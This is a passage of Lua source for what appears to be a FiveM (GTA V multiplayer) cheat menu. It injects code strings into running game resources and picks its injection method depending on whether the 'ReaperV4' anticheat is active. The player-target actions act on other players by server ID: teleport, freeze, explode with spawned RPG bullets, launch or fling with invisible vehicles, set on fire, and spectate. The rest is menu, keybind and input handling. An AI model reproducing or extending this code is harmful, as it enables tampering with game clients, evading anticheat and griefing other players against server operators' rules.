                            SafeRunNative(FreezeEntityPosition, vehicle, true)
                        end

                        if not IsEntityAttachedToEntity(vehicle, selfPed) then
                            SafeRunNative(
                                AttachEntityToEntity,
                                vehicle,
                                selfPed,
                                GetPedBoneIndex(selfPed, 24816),
                                2.0, 0.0, 0.5,
                                90.0, 0.0, 0.0,
                                true, true, false, false, 2, true
                            )
                        end

                        if IsControlJustPressed(0, 246) or IsDisabledControlJustPressed(0, 246) then
                            SafeRunNative(SetEntityNoCollisionEntity, vehicle, selfPed, false)

                            local camCoords = GetGameplayCamCoord()
                            local targetCoords = getCamRaycastHit()
                            local dir = vector3(
                                targetCoords.x - camCoords.x,
                                targetCoords.y - camCoords.y,
                                targetCoords.z - camCoords.z
                            )

                            local length = math.sqrt(dir.x * dir.x + dir.y * dir.y + dir.z * dir.z)
                            dir = vector3(dir.x / length, dir.y / length, dir.z / length)

                            local spawnCoords = vector3(
                                camCoords.x + dir.x * 2.0,
                                camCoords.y + dir.y * 2.0,
                                camCoords.z + dir.z * 2.0
                            )

                            DetachEntity(vehicle, true, true)
                            FreezeEntityPosition(vehicle, false)

                            SafeRunNative(
                                SetEntityCoordsNoOffset,
                                vehicle,
                                spawnCoords.x,
                                spawnCoords.y,
                                spawnCoords.z,
                                false, false, false
                            )

                            SafeRunNative(
                                ApplyForceToEntity,
                                vehicle,
                                1,
                                dir.x * force,
                                dir.y * force,
                                dir.z * force,
                                0.0, 0.0, 0.0,
                                0,
                                false, true, true, false, true
                            )

                            SafeRunNative(SetTimeout, 500, function()
                                selfPed = PlayerPedId()
                                
                                SafeRunNative(SetEntityNoCollisionEntity, vehicle, selfPed, false)
                            end)

                            break
                        end
                        
                        Wait(0)
                    end

                    local selfPed = PlayerPedId()

                    ClearPedTasks(selfPed)
                end)

                return true
            end

            GetNearestVehicle = function(networkRequire)
                local vehicles = GetGamePool('CVehicle')
                local selfPed = PlayerPedId()
                local selfCoords = GetEntityCoords(selfPed)
                local nearestVehicle

                for i = 1, #vehicles do
                    local vehicle = vehicles[i]
                    local networked = NetworkGetEntityIsNetworked(vehicle)

                    if networked or not networkRequire then
                        local coords = GetEntityCoords(vehicle)
                        local distance = #(coords - selfCoords)

                        if not nearestVehicle or distance < nearestVehicle.distance then
                            nearestVehicle = {vehicle = vehicle, distance = distance}
                        end
                    end
                end

                if nearestVehicle then return nearestVehicle.vehicle end
            end

            ShootBullet = function(ped, weapon, targetCoords, fromCoords)
                SafeRunNative(CreateThread, function()
                    if not IsWeaponValid(weapon) then
                        return false
                    end

                    if ped == PlayerPedId() then
                        ped = 'self'
                    end

                    local isSelf = ped == 'self'
                    local canShoot = false
                    local setTimer = GetGameTimer()

                    _G.SelfClient_ShootBulletData = _G.SelfClient_ShootBulletData or {}

                    local bulletData = _G.SelfClient_ShootBulletData[ped]

                    if bulletData then
                        if bulletData.weapon == weapon then
                            canShoot = true
                        elseif (setTimer - bulletData.timer) > 500 then
                            canShoot = true
                        end
                    else
                        canShoot = true
                    end

                    if canShoot then
                        _G.SelfClient_ShootBulletData[ped] = {
                            timer = setTimer,
                            weapon = weapon
                        }

                        if not bulletData then
                            local targetPed = isSelf and PlayerPedId() or ped
                            local cachedSelfData = GetCachedSelfData()

                            SendToHook('GiveWeaponToPed', NetworkGetNetworkIdFromEntity(targetPed), weapon, 1)
                            SafeRunNative(SetPedUsingActionMode, targetPed, true, -1, 1)
                            SafeRunNative(SetPedCurrentWeaponVisible, targetPed, false, false, true, true)
                            SafeRunNative(SetCurrentPedWeapon, targetPed, weapon, true)
                            SafeRunNative(ClearPedTasksImmediately, targetPed)
                            SetCurrentSelfData(cachedSelfData)

                            Wait(10)
                        end

                        SafeRunNative(RequestWeaponAsset, weapon, 31, 26)

                        fromCoords = fromCoords or (targetCoords + vec3(0.0, 0.0, 0.1))

                        SafeRunNative(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, isSelf and PlayerPedId() or ped, true, false, 999999.0)

                        if not bulletData then
                            while true do
                                local shootBulletData = _G.SelfClient_ShootBulletData

                                if shootBulletData then
                                    local bulletPedData = shootBulletData[ped]

                                    if not bulletPedData or bulletPedData.weapon ~= weapon or (GetGameTimer() - bulletPedData.timer) > 500 then
                                        _G.SelfClient_ShootBulletData[ped] = nil

                                        break
                                    end
                                else
                                    break
                                end

                                local targetPed = isSelf and PlayerPedId() or ped

                                if not HasPedGotWeapon(targetPed, weapon, false) then
                                    local cachedSelfData = GetCachedSelfData()

                                    SendToHook('GiveWeaponToPed', NetworkGetNetworkIdFromEntity(targetPed), weapon, 250)
                                    SafeRunNative(ClearPedTasksImmediately, targetPed)
                                    SetCurrentSelfData(cachedSelfData)
                                end

                                local found, foundWeapon = GetCurrentPedWeapon(targetPed)
                                if foundWeapon ~= weapon then
                                    local cachedSelfData = GetCachedSelfData()

                                    SafeRunNative(SetCurrentPedWeapon, targetPed, weapon, true)
                                    SafeRunNative(ClearPedTasksImmediately, targetPed)
                                    SetCurrentSelfData(cachedSelfData)
                                end

                                SafeRunNative(SetPedUsingActionMode, targetPed, true, -1, 1)
                                SafeRunNative(SetPedCurrentWeaponVisible, targetPed, false, false, true, true)

                                Wait(0)
                            end

                            local targetPed = isSelf and PlayerPedId() or ped

                            SafeRunNative(SetPedUsingActionMode, targetPed, false, -1, 'DEFAULT_ACTION')
                            SafeRunNative(RemoveWeaponFromPed, targetPed, weapon)
                            SafeRunNative(SetCurrentPedWeapon, targetPed, 'weapon_unarmed', true)
                        end
                    end
                end)
            end
        ]]..code..[[
    ]]

    if GetResourceState('ReaperV4') == 'started' then
        MachoInjectResource2(NewThread, resource, setCode)
    else
        MachoInjectResourceScriptOverride(1, resource, setCode, '@citizen:/scripting/lua/scheduler.lua', 1, 999)
    end
end

GetCachedSelfData = function()
    local selfPed = PlayerPedId()
    local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
    local selfData = {
        ped = selfPed,
        coords = GetEntityCoords(selfPed),
        heading = GetEntityHeading(selfPed)
    }

    selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

    if selfVehicle then
        selfData.vehicle = selfVehicle

        for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
            if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                selfData.seat = i

                break
            end
        end
    end
    
    return selfData
end

SetCurrentSelfData = function(setData)
    local selfPed = PlayerPedId()
    local setVehicle = setData.vehicle
    local setSeat = setData.seat

    if setVehicle and setSeat and DoesEntityExist(setVehicle) then
        TaskWarpPedIntoVehicle(selfPed, setVehicle, setSeat)
    else
        local setCoords = setData.coords

        SetEntityCoordsNoOffset(selfPed, setCoords.x, setCoords.y, setCoords.z, false, false, true)
        SetEntityHeading(selfPed, setData.heading)
    end
end

TrackedSafeThreads = {}

DeleteTrackedThread = function(threadName)
    local setThreadCb = TrackedSafeThreads[threadName]

    if setThreadCb then
        setThreadCb()
    end
end

CreateTrackedThread = function(threadName, setHandlers)
    DeleteTrackedThread(threadName)

    if type(setHandlers) ~= 'table' or type(setHandlers.thread) ~= 'function' then
		return
	end

    CreateThread(function()
        setHandlers.isActive = true

        TrackedSafeThreads[threadName] = function()
            setHandlers.isActive = false

            TrackedSafeThreads[threadName] = nil
            TerminateThisThread()

            if setHandlers.onRemove then
                setHandlers.onRemove(setHandlers)
            end
        end

        setHandlers.thread(setHandlers)
    end)
end

local itemKeybinds = {}
local KeyMap = {
    [8]='Backspace', [9]='Tab',     [12]='Clear',      [13]='Enter',     [16]='Shift',
    [17]='Control',  [18]='Alt',    [19]='Pause',       [20]='Caps Lock', [27]='Escape',
    [32]='Space',    [33]='PageUp', [34]='PageDown',    [35]='End',       [36]='Home',
    [44]='PrintScreen', [45]='Insert', [46]='Delete',
    [37]='ArrowLeft', [38]='ArrowUp', [39]='ArrowRight', [40]='ArrowDown',
    [48]='0',[49]='1',[50]='2',[51]='3',[52]='4',[53]='5',[54]='6',[55]='7',[56]='8',[57]='9',
    [65]='A',[66]='B',[67]='C',[68]='D',[69]='E',[70]='F',[71]='G',[72]='H',[73]='I',[74]='J',
    [75]='K',[76]='L',[77]='M',[78]='N',[79]='O',[80]='P',[81]='Q',[82]='R',[83]='S',[84]='T',
    [85]='U',[86]='V',[87]='W',[88]='X',[89]='Y',[90]='Z',
    [91]='LeftMeta', [92]='RightMeta', [93]='ContextMenu',
    [96]='Numpad0',[97]='Numpad1',[98]='Numpad2',[99]='Numpad3',[100]='Numpad4',
    [101]='Numpad5',[102]='Numpad6',[103]='Numpad7',[104]='Numpad8',[105]='Numpad9',
    [106]='Multiply',[107]='Add',[108]='Separator',[109]='Subtract',[110]='Decimal',[111]='Divide',
    [112]='F1',[113]='F2',[114]='F3',[115]='F4',[116]='F5',[117]='F6',
    [118]='F7',[119]='F8',[120]='F9',[121]='F10',[122]='F11',[123]='F12',
    [124]='F13',[125]='F14',[126]='F15',[127]='F16',[128]='F17',[129]='F18',
    [130]='F19',[131]='F20',[132]='F21',[133]='F22',[134]='F23',[135]='F24',
    [144]='NumLock', [145]='ScrollLock',
    [160]='LeftShift',[161]='RightShift',[162]='LeftControl',[163]='RightControl',
    [164]='LeftAlt',[165]='RightAlt',
    [173]='VolumeMute',[174]='VolumeDown',[175]='VolumeUp',
    [181]='MediaMute',[182]='MediaVolumeDown',[183]='MediaVolumeUp',
    [186]=';',[187]='=',[188]=',',[189]='-/_',[190]='.',[191]='/',[192]='`',
    [219]='[',[220]='\\',[221]=']',[222]="'",[223]='`',
}

local keyMap = {
    [65] = 'A', [66] = 'B', [67] = 'C', [68] = 'D', [69] = 'E', [70] = 'F', [71] = 'G', [72] = 'H',
    [73] = 'I', [74] = 'J', [75] = 'K', [76] = 'L', [77] = 'M', [78] = 'N', [79] = 'O', [80] = 'P',
    [81] = 'Q', [82] = 'R', [83] = 'S', [84] = 'T', [85] = 'U', [86] = 'V', [87] = 'W', [88] = 'X',
    [89] = 'Y', [90] = 'Z',

    [48] = '0', [49] = '1', [50] = '2', [51] = '3', [52] = '4', [53] = '5', [54] = '6', [55] = '7',
    [56] = '8', [57] = '9',

    [96] = '0', [97] = '1', [98] = '2', [99] = '3', [100] = '4', [101] = '5', [102] = '6', [103] = '7',
    [104] = '8', [105] = '9',

    [32] = ' ',
    [188] = ',', [190] = '.', [191] = '/', [186] = ';', [222] = '\'', [219] = '[', [221] = ']',
    [220] = '\\', [189] = '-', [187] = '=', [192] = '`',
}

local shiftedNumbers = {
    [48] = ')', [49] = '!', [50] = '@', [51] = '#', [52] = '$',
    [53] = '%', [54] = '^', [55] = '&', [56] = '*', [57] = '('
}

local shiftedChars = {
    [188] = '<', [190] = '>', [191] = '?', [186] = ':', [222] = '"',
    [219] = '{', [221] = '}', [220] = '|', [189] = '_', [187] = '+', [192] = '~'
}

local keyLabels = {
    [8] = 'Backspace', [9] = 'Tab', [13] = 'Enter',
    [16] = 'Shift', [17] = 'Ctrl', [18] = 'Alt',
    [19] = 'Pause', [20] = 'Caps Lock', [27] = 'Esc',
    [32] = 'Space', [33] = 'Page Up', [34] = 'Page Down',
    [35] = 'End', [36] = 'Home', [37] = 'Left Arrow',
    [38] = 'Up Arrow', [39] = 'Right Arrow', [40] = 'Down Arrow',
    [44] = 'Print Screen', [45] = 'Insert', [46] = 'Delete',
    [48] = '0', [49] = '1', [50] = '2',
    [51] = '3', [52] = '4', [53] = '5',
    [54] = '6', [55] = '7', [56] = '8',
    [57] = '9', [65] = 'A', [66] = 'B',
    [67] = 'C', [68] = 'D', [69] = 'E',
    [70] = 'F', [71] = 'G', [72] = 'H',
    [73] = 'I', [74] = 'J', [75] = 'K',
    [76] = 'L', [77] = 'M', [78] = 'N',
    [79] = 'O', [80] = 'P', [81] = 'Q',
    [82] = 'R', [83] = 'S', [84] = 'T',
    [85] = 'U', [86] = 'V', [87] = 'W',
    [88] = 'X', [89] = 'Y', [90] = 'Z',
    [91] = 'Left Windows', [92] = 'Right Windows', [93] = 'Context Menu',
    [96] = 'Numpad 0', [97] = 'Numpad 1', [98] = 'Numpad 2',
    [99] = 'Numpad 3', [100] = 'Numpad 4', [101] = 'Numpad 5',
    [102] = 'Numpad 6', [103] = 'Numpad 7', [104] = 'Numpad 8',
    [105] = 'Numpad 9', [106] = 'Numpad *', [107] = 'Numpad +',
    [109] = 'Numpad -', [110] = 'Numpad .', [111] = 'Numpad /',
    [112] = 'F1', [113] = 'F2', [114] = 'F3',
    [115] = 'F4', [116] = 'F5', [117] = 'F6',
    [118] = 'F7', [119] = 'F8', [120] = 'F9',
    [121] = 'F10', [122] = 'F11', [123] = 'F12',
    [144] = 'Num Lock', [145] = 'Scroll Lock', [160] = 'Left Shift',
    [161] = 'Right Shift', [162] = 'Left Ctrl', [163] = 'Right Ctrl',
    [164] = 'Left Alt', [165] = 'Right Alt', [186] = ';',
    [187] = '=', [188] = ',', [189] = '-',
    [190] = '.', [191] = '/', [192] = '`',
    [219] = '[', [220] = '\\', [221] = ']',
    [222] = '\'', [226] = '\\ (Oem102)', [255] = 'Unknown'
}

local function getInputChar(keyCode, isShiftHeld)
    local numKey = tonumber(keyCode)
    if not numKey then return nil end

    if isShiftHeld then
        local shifted = shiftedNumbers[numKey] or shiftedChars[numKey]
        if shifted then return shifted end
    end

    local char = keyMap[numKey]
    if char then
        if numKey >= 65 and numKey <= 90 and not isShiftHeld then
            return string.lower(char)
        end
        return char
    end

    return nil
end

local inputActive = false
local inputBuffer = ''
local inputCallback = nil
local inputTitle = ''

local ctrlHeld = false
local shiftHeld = false

local keybindActive = false
local keybindPending = ''
local keybindTitle = ''
local keybindOnConfirm = nil
local keybindOnCancel = nil
local keybindCanCancel = true
local settingItemKeybind = false

local function toggleNuiFocus(SET_TOGGLE)
    if SET_TOGGLE then
        injectCode('monitor', [[
            nuifoc = true
            SafeRunNative(CreateThread, function()
                while nuifoc do
                    SafeRunNative(SetNuiFocus, true, true)
                    Wait(0)
                end
            end)
        ]])
    else
        injectCode('monitor', [[ nuifoc = false; SafeRunNative(SetNuiFocus, false, false) ]])
    end
end

function showInput(title, defaultText, callback)
    inputActive = true
    setInputActive = true
    inputBuffer = defaultText or ''
    inputCallback = callback
    inputTitle = title or ''
    SendSvelte('showInputPrompt', { showInput = true, title = inputTitle, value = inputBuffer, isKeybind = false })

    toggleNuiFocus(true)
end

function setKeybind(title, setupFn)
    defaultBind = nil
    canCancel = true
    onConfirm = nil
    onCancel = nil

    if type(setupFn) == 'function' then setupFn(nil) end

    if type(defaultBind) == 'number' then
        keybindPending = KeyMap[defaultBind] or tostring(defaultBind)
    else
        keybindPending = defaultBind and tostring(defaultBind) or ''
    end

    keybindActive = true
    settingItemKeybind = true
    keybindOnConfirm = onConfirm
    keybindOnCancel = onCancel
    keybindCanCancel = (canCancel ~= false)
    keybindTitle = title

    SendSvelte('showInputPrompt', { showInput = true, title = keybindTitle, value = keybindPending, isKeybind = true })
    toggleNuiFocus(true)
end

function showNotify(message, type)
    SendSvelte('notify', { message = message, type = type })
end

CreateHook('FreecamObjectInput', function()
    showInput('Object Model', '', function(objectModel)
        if not objectModel or objectModel == '' then
            return
        end

        injectCode('monitor', string.format([[
            _G.SetClient_CustomSetFcSpawnObject = %q
        ]], objectModel))

        showNotify('Free cam object set to: ' .. objectModel, 'success')
    end)
end)

CreateHook('FreecamPedInput', function()
    showInput('Ped Model', '', function(pedModel)
        if not pedModel or pedModel == '' then
            return
        end

        injectCode('monitor', string.format([[
            _G.SetClient_CustomSetFcSpawnPed = %q
        ]], pedModel))

        showNotify('Free cam ped set to: ' .. pedModel, 'success')
    end)
end)

CreateHook('FreecamNotify', function(message, kind)
    showNotify(message, kind or 'info')
end)

CreateHook('FcPlayerTarget', function(sid, name)
    local actions = { 'Teleport To', 'Bring Here', 'Spectate', 'Freeze', 'Explode', 'Launch', 'Fling', 'Burn' }
    injectCode('monitor', string.format([[
        _G.SetClient_FcTargetSid = %d
        _G.SetClient_FcTargetIdx = 1
    ]], sid))
    SendSvelte('fcTarget', { visible = true, name = name, actions = actions, index = 1 })
end)

CreateHook('FcTargetCancel', function()
    injectCode('monitor', [[
        _G.SetClient_FcTargetSid = nil
        _G.SetClient_FcTargetIdx = nil
    ]])
    SendSvelte('fcTarget', { visible = false })
end)

CreateHook('FcTargetScroll', function(idx)
    SendSvelte('fcTargetScroll', { index = idx })
end)

CreateHook('FcPlayerAction', function(actionName, sid)
    local serverId = tonumber(sid)
    if not serverId then return end
    injectCode('monitor', [[
        _G.SetClient_FcTargetSid = nil
        _G.SetClient_FcTargetIdx = nil
    ]])
    SendSvelte('fcTarget', { visible = false })
    if actionName == 'Teleport To' then
        injectCode('monitor', string.format([[
            local player = GetPlayerFromServerId(%d)
            local targetPed = player > 0 and GetPlayerPed(player)
            if targetPed and targetPed > 0 then
                local coords = GetEntityCoords(targetPed)
                SafeRunNative(SetEntityCoords, PlayerPedId(), coords.x, coords.y, coords.z + 0.0, false, false, false, true)
            end
        ]], serverId))
    elseif actionName == 'Bring Here' then
        injectCode('monitor', string.format([[
            local player = GetPlayerFromServerId(%d)
            local targetPed = player > 0 and GetPlayerPed(player)
            if targetPed and targetPed > 0 then
                local selfCoords = GetEntityCoords(PlayerPedId())
                SafeRunNative(SetEntityCoords, targetPed, selfCoords.x, selfCoords.y, selfCoords.z, false, false, false, true)
            end
        ]], serverId))
    elseif actionName == 'Spectate' then
        injectCode('any', string.format([[
            _G.__SpectateRunning = true
            local tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
            local cam = SafeRunNative(CreateCam, "DEFAULT_SCRIPTED_CAMERA", true)
            SafeRunNative(SetCamActive, cam, true)
            SafeRunNative(RenderScriptCams, true, false, 0, true, false)
            SafeRunNative(CreateThread, function()
                local distanceBehind = 3.0
                local baseHeight = 1.0
                while _G.__SpectateRunning and tgtPed and DoesEntityExist(tgtPed) do
                    Wait(1)
                    local coords = GetEntityCoords(tgtPed)
                    SafeRunNative(RequestAdditionalCollisionAtCoord, coords.x, coords.y, coords.z)
                    SafeRunNative(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                    local camRot = GetGameplayCamRot(0)
                    local pitch = -math.rad(camRot.x)
                    local heading = math.rad(camRot.z)
                    local offsetX = -math.sin(heading) * math.cos(pitch) * distanceBehind
                    local offsetY =  math.cos(heading) * math.cos(pitch) * distanceBehind
                    local offsetZ =  math.sin(pitch) * distanceBehind
                    SafeRunNative(SetCamCoord, cam, coords.x + offsetX, coords.y + offsetY, coords.z + baseHeight + offsetZ)
                    SafeRunNative(PointCamAtEntity, cam, tgtPed, 0.0, 0.0, 0.8, true)
                    tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                end
                SafeRunNative(ClearFocus)
                SafeRunNative(RenderScriptCams, false, false, 0, true, false)
                SafeRunNative(DestroyCam, cam, false)
            end)
        ]], serverId, serverId))
    elseif actionName == 'Freeze' then
        injectCode('monitor', string.format([[
            if _G.SetClient_RunningFreezePlayer then return end
            _G.SetClient_RunningFreezePlayer = true
            SafeRunNative(SetEntityVisible, PlayerPedId(), false, false)
            local selfPed = PlayerPedId()
            local setCoords = GetEntityCoords(selfPed)
            local setHeading = GetEntityHeading(selfPed)
            SafeRunNative(CreateThread, function()
                local player = GetPlayerFromServerId(%d)
                local targetPed = player > 0 and GetPlayerPed(player)
                if targetPed and targetPed > 0 and targetPed ~= PlayerPedId() then
                    local targetEntity = GetVehiclePedIsIn(targetPed, false)
                    if not targetEntity or targetEntity <= 0 then targetEntity = targetPed end
                    while _G.SetClient_RunningFreezePlayer do
                        SafeRunNative(AttachEntityToEntityPhysically, PlayerPedId(), targetEntity, 0, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 999999999, true, true, true, true, 1)
                        Wait(0)
                    end
                end
                selfPed = PlayerPedId()
                SafeRunNative(ClearPedTasksImmediately, selfPed)
                Wait(50)
                SafeRunNative(DetachEntity, selfPed, true, true)
                SafeRunNative(FreezeEntityPosition, selfPed, false)
                SafeRunNative(SetEntityCoords, selfPed, setCoords.x, setCoords.y, setCoords.z, false, false, false, true)
                SafeRunNative(SetEntityHeading, selfPed, setHeading)
                SafeRunNative(SetEntityVisible, selfPed, true, false)
                Wait(100)
                _G.SetClient_RunningFreezePlayer = false
            end)
        ]], serverId))
    elseif actionName == 'Explode' then
        injectCode('any', string.format([[
            local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
            if DoesEntityExist(targetPed) then
                local coords = GetEntityCoords(targetPed) + vec3(0.0, 0.0, 0.2)
                ShootBullet('self', GetHashKey('WEAPON_RPG'), coords, coords + vec3(0.0, 0.0, 3.0))
            end
        ]], serverId))
    elseif actionName == 'Launch' then
        injectCode('monitor', string.format([[
            local player = GetPlayerFromServerId(%d)
            local targetPed = player > 0 and GetPlayerPed(player)
            if targetPed and targetPed > 0 then
                SafeRunNative(CreateThread, function()
                    local vehicleHash = GetHashKey('adder')
                    RequestModel(vehicleHash)
                    local setTimer = GetGameTimer()
                    while not HasModelLoaded(vehicleHash) do
                        Wait(0)
                        if (GetGameTimer() - setTimer) > 5000 then return end
                    end
                    local selfCoords = GetEntityCoords(PlayerPedId())
                    local vehicle = SafeRunNative(CreateVehicle, vehicleHash, selfCoords.x, selfCoords.y, selfCoords.z, 0.0, true, false)
                    SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)
                    if not vehicle or vehicle <= 0 then return end
                    SafeRunNative(SetEntityInvincible, vehicle, true)
                    SafeRunNative(SetEntityVisible, vehicle, false)
                    local underCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.0, -1.5)
                    SetCoords(vehicle, underCoords)
                    SafeRunNative(FreezeEntityPosition, vehicle, false)
                    SafeRunNative(SetEntityVelocity, vehicle, 0.0, 0.0, 0.0)
                    SafeRunNative(ApplyForceToEntity, vehicle, 1, 0.0, 0.0, 250.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                    SafeRunNative(ApplyForceToEntityCenterOfMass, targetPed, 1, 0.0, 0.0, 150.0, false, true, true, false)
                    Wait(1200)
                    SafeRunNative(DeleteEntity, vehicle)
                end)
            end
        ]], serverId))
    elseif actionName == 'Fling' then
        injectCode('monitor', string.format([[
            local player = GetPlayerFromServerId(%d)
            local targetPed = player > 0 and GetPlayerPed(player)
            if targetPed and targetPed > 0 then
                SafeRunNative(CreateThread, function()
                    local vehicleHash = GetHashKey('adder')
                    RequestModel(vehicleHash)
                    local setTimer = GetGameTimer()
                    while not HasModelLoaded(vehicleHash) do
                        Wait(0)
                        if (GetGameTimer() - setTimer) > 5000 then return end
                    end
                    local selfCoords = GetEntityCoords(PlayerPedId())
                    local vehicle = SafeRunNative(CreateVehicle, vehicleHash, selfCoords.x, selfCoords.y, selfCoords.z, 0.0, true, false)
                    SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)
                    if not vehicle or vehicle <= 0 then return end
                    SafeRunNative(SetEntityInvincible, vehicle, true)
                    SafeRunNative(SetEntityVisible, vehicle, false)
                    local underCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.0, -1.5)
                    SetCoords(vehicle, underCoords)
                    SafeRunNative(FreezeEntityPosition, vehicle, false)
                    SafeRunNative(SetEntityVelocity, vehicle, 0.0, 0.0, 0.0)
                    SafeRunNative(ApplyForceToEntity, vehicle, 1, 0.0, 0.0, 400.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                    Wait(1200)
                    SafeRunNative(DeleteEntity, vehicle)
                end)
            end
        ]], serverId))
    elseif actionName == 'Burn' then
        injectCode('any', string.format([[
            local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
            if DoesEntityExist(targetPed) then
                local coords = GetEntityCoords(targetPed)
                SafeRunNative(StartScriptFire, coords.x, coords.y, coords.z, 3, 1.0)
            end
        ]], serverId))
    end
end)

CreateHook('ShowPropInput', function(currentValue)
    if propInputOpen then return end
    if menuOpen then return end
    propInputOpen = true
    injectCode('monitor', '_G.SetClient_PropInputActive = true')
    MachoExecuteDuiScript(Dui, 'window.hoveringText.hideList();')

    showInput('Enter Prop Name', currentValue or '', function(result)
        propInputOpen = false
        injectCode('monitor', '_G.SetClient_PropInputActive = false')
        MachoExecuteDuiScript(Dui, 'window.hoveringText.showList();')
        if result and result ~= '' then
            injectCode('monitor', string.format('_G.SetClient_CustomFcSpawnProp = %q', result))
        end
    end)
end)

local function bindItemToKey(item, keyName)
    itemKeybinds[keyName] = nil
    for k, v in pairs(itemKeybinds) do
        if v == item then itemKeybinds[k] = nil end
    end

    itemKeybinds[keyName] = item

    local binds = {}
    for k, v in pairs(itemKeybinds) do
        binds[#binds + 1] = { label = v.label or '?', key = k }
    end
    SendSvelte('updateKeybinds', { KeyBinds = binds })
end

local function startItemKeybindCapture(item)
    local currentKey = ''
    for k, v in pairs(itemKeybinds) do
        if v == item then currentKey = k break end
    end

    setKeybind('Bind: ' .. (item.label or 'item'), function()
        defaultBind = currentKey
        canCancel = true

        onConfirm = function(key) 
            bindItemToKey(item, key) 
        end
    end)
end

local function isSelectable(item)
    return item
    and item.type ~= "divider"
    and not item.hidden
    and item.visible ~= false
end

local function wrapIndex(index, size)
    return ((index - 1) % size) + 1
end

local function findNextSelectable(menu, startIndex, direction)
    local size = #menu
    if size == 0 then
        return startIndex
    end

    local index = startIndex

    for _ = 1, size do
        index = wrapIndex(index, size)

        if isSelectable(menu[index]) then
            return index
        end

        index = index + direction
    end

    return startIndex
end

local function refreshMenu()
    createIndex()
    setCurrent()
end

local function createActiveIndex(direction)
    local size = menuConfig and #menuConfig or 0
    if size == 0 then
        return
    end

    activeIndex = findNextSelectable(
        menuConfig,
        activeIndex + (direction > 0 and 1 or -1),
        direction
    )

    setCurrent()
end

function createIndex()
    if not menuConfig or #menuConfig == 0 then
        return
    end

    activeIndex = findNextSelectable(menuConfig, activeIndex, 1)
end

local function createConfirm(item, value)
    local callback = item and item.onConfirm

    if item and item.autoConfirm and type(callback) == "function" then
        callback(value)
    end
end

local function createSlider(item, direction)
    local step = item.step or item.stepSize or 1
    local min = tonumber(item.min) or 0
    local max = tonumber(item.max) or 100
    local value = tonumber(item.value) or 0

    item.value = math.min(max, math.max(min, value + direction * step))

    createConfirm(item, item.value)
end

local function createScroll(item, direction)
    local options = item.options
    local count = options and #options or 0

    if count == 0 then
        return
    end

    item.selected = wrapIndex(
        (tonumber(item.selected) or 1) + direction,
        count
    )

    createConfirm(item, options[item.selected])
end

local function hasType(itemType, target)
    if itemType == target then
        return true
    end

    if type(itemType) == "table" then
        for i = 1, #itemType do
            if itemType[i] == target then
                return true
            end
        end
    end

    return false
end

local function createValue(item, direction)
    if not item then
        return
    end

    if hasType(item.type, "slider") then
        return createSlider(item, direction)
    end

    if hasType(item.type, "scroll") then
        return createScroll(item, direction)
    end
end

local function createOptions(control, item)
    if not item then
        return
    end

    createValue(item, control == "ArrowRight" and 1 or -1)
    setCurrent()
end

local confirmHandlers = {
    checkbox = function(item)
        item.onConfirm(item.checked)
    end,

    slider = function(item)
        item.onConfirm(item.value)
    end,

    scroll = function(item)
        item.onConfirm(
            item.options and item.options[item.selected or 1]
        )
    end,

    button = function(item)
        item.onConfirm()
    end
}

local function fireConfirm(item, itemType)
    local callback = item.onConfirm

    if type(callback) ~= "function" then
        return
    end

    local handler = confirmHandlers[itemType]

    if handler then
        handler(item)
    end
end

local function sendTabs(tabs)
    if not Dui or not tabs then
        return
    end

    local names = table.create and table.create(#tabs, 0) or {}

    for i = 1, #tabs do
        names[i] = tabs[i].name
    end

    MachoSendDuiMessage(Dui, json.encode({
        action = "setTabs",
        tabs = names
    }))

    MachoSendDuiMessage(Dui, json.encode({
        action = "setTabIndex",
        index = currentTabIndex
    }))
end

local function loadTab(tabIndex, savedIndex)
    local tab = currentTabs and currentTabs[tabIndex + 1]

    if not tab then
        return
    end

    currentTabIndex = tabIndex
    menuConfig = tab.submenu or {}

    activeIndex = math.min(
        savedIndex or 1,
        math.max(#menuConfig, 1)
    )

    refreshMenu()
end

local function createEnter(item)
    if not item then
        return
    end

    local itemType = item.type

    if itemType == "submenu" then
        nestedMenus[#nestedMenus + 1] = {
            index = activeIndex,
            menu = menuConfig,
            label = item.label
        }

        if item.submenu then
            menuConfig = item.submenu
            activeIndex = 1
            currentTabs = nil

            refreshMenu()
            return
        end

        local tabs = item.tabs

        if tabs and #tabs > 0 then
            currentTabs = tabs

            loadTab(0, 1)
            sendTabs(tabs)
        end

        return
    end

    if type(itemType) == "table" then
        if hasType(itemType, "checkbox") then
            item.checked = not item.checked

            if menuOpen then
                setCurrent()
            end
        end

        for i = 1, #itemType do
            fireConfirm(item, itemType[i])
        end

        return
    end

    if itemType == "checkbox" then
        item.checked = not item.checked

        if menuOpen then
            setCurrent()
        end
    end

    fireConfirm(item, itemType)
end

local function createBackspace()
    local depth = #nestedMenus

    if depth == 0 then
        toggleMenu(false)
        return
    end

    local previous = nestedMenus[depth]
    nestedMenus[depth] = nil

    menuConfig = previous.menu
    activeIndex = previous.index or 1

    if depth == 1 then
        currentTabIndex = 0
        currentTabs = nil

        if Dui then
            MachoSendDuiMessage(Dui, json.encode({
                action = "resetTabs"
            }))
        end
    end

    refreshMenu()
end

local function createTabs(control)
    local count = currentTabs and #currentTabs or 0

    if count == 0 then
        return
    end

    currentTabIndex = (
        currentTabIndex +
        (control == "Q" and -1 or 1)
    ) % count

    loadTab(currentTabIndex, 1)

    if Dui then
        MachoSendDuiMessage(Dui, json.encode({
            action = "setTabIndex",
            index = currentTabIndex
        }))
    end
end

MachoOnKeyDown(function(key)
    local setKey = KeyMap[tonumber(key) or key] or tostring(key)

